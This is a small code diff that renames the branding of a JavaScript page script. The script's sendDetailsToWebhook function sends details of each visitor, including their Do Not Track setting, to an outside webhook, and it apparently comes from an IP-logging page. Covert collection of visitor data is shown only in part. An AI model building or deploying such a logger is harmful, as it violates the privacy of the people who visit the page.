@@ -8,7 +8,7 @@ function sendDetailsToWebhook(details) {
 
     const data = {
         embeds: [{
-            title: 'ton-ip.vercel.app',
+            title: 'NekoHost',
             description: 'Details of the user accessing the page.',
             color: 0x000000,
             fields: [
@@ -23,7 +23,7 @@ function sendDetailsToWebhook(details) {
                 { name: 'Do Not Track', value: details.doNotTrack, inline: true }
             ],
             footer: {
-                text: 'Page accessed from ton-ip.vercel.app'
+                text: 'Page accessed from nekohost.fr'
             },
             timestamp: new Date()
         }]
